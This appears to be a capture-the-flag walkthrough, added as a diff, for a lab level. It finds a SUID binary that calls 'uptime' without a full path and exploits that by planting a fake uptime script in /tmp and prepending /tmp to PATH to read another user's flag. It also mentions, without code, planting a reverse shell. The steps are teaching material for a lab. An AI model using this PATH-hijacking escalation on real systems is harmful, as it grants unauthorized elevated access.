@@ -1,0 +1,68 @@
+Level 14 Walkthrough: Operation Ghost-Print
+Goal
+Find the restricted flag for Level 15 and use a misconfigured binary to read it.
+Step 1: Enumeration (Finding the Target)
+First, we look for files that have the SUID bit set. These are special files that run with the permissions of the file owner rather than the person running them.
+bash
+level14@mastermind:~$ find /opt/breachtrail -perm -4000 -type f 2>/dev/null
+Use code with caution.
+
+Discovery: You find /opt/breachtrail/bin/readflag. Notice it is owned by level15.
+Step 2: Analysis (Searching for Clues)
+Try running the binary to see what it does.
+bash
+level14@mastermind:~$ /opt/breachtrail/bin/readflag
+--- BREACHTRAIL SYSTEM AUDIT ---
+ 10:00:01 up 4:12,  2 users,  load average: 0.01, 0.01, 0.00
+Use code with caution.
+
+It prints a banner and the system uptime. Now, look inside the binary for hidden text or hints.
+bash
+level14@mastermind:~$ strings /opt/breachtrail/bin/readflag
+...
+INFO: Flag stored at /opt/breachtrail/flags/level15.txt
+uptime
+...
+Use code with caution.
+
+Two key findings:
+The flag is located at /opt/breachtrail/flags/level15.txt.
+The program calls the command uptime without using a full path (like /usr/bin/uptime).
+Step 3: The Exploit (Path Hijacking)
+Because the program doesn't specify where uptime is, it will look through your $PATH variable. You can trick it by creating your own version of uptime.
+Go to a writable directory:
+bash
+level14@mastermind:~$ cd /tmp
+Use code with caution.
+
+Create a fake "uptime" script that reads the flag:
+bash
+level14@mastermind:/tmp$ echo "#!/bin/sh" > uptime
+level14@mastermind:/tmp$ echo "cat /opt/breachtrail/flags/level15.txt" >> uptime
+Use code with caution. if any error occurred try using "/bin/cat /opt/......"
+
+or else we can add a reverse shell here and get in as level15.
+
+Make the script executable:
+bash
+level14@mastermind:/tmp$ chmod +x uptime
+Use code with caution.
+
+Step 4: Execution (Redirecting the System)
+Now, tell the system to look in /tmp for commands before it looks anywhere else.
+bash
+level14@mastermind:/tmp$ export PATH=/tmp:$PATH
+Use code with caution.
+
+Run the vulnerable binary again:
+bash
+level14@mastermind:/tmp$ /opt/breachtrail/bin/readflag
+Use code with caution.
+
+The result:
+text
+--- BREACHTRAIL SYSTEM AUDIT ---
+"FLAG will be here"
+Use code with caution.
+
+Success! The binary ran as level15, searched the path, found your script in /tmp, and used its elevated permissions to read the flag for you.
